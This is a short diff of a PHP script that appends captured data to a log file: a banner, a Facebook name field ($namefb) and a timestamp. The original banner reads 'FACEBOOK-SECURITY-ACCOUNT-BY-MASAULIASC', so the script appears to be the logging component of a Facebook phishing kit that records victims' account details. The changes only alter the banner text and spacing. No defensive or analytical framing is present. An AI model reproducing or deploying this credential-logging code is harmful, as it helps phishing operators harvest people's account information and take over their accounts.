@@ -11,11 +11,11 @@ $today = date("F j, Y, g:i a");
 
 $handle = fopen($file, 'a');
 
-fwrite($handle, "----FACEBOOK-SECURITY-ACCOUNT-BY-MASAULIASC----");
+fwrite($handle, "---------------------------------------------------");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "Name      : ");
+fwrite($handle, "Name: ");
 
 fwrite($handle, " $namefb");
 
@@ -45,7 +45,7 @@ fwrite($handle, " $today");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "----------------------END----------------------");
+fwrite($handle, "---------------------------------------------------");
 
 fwrite($handle, "\n");
 
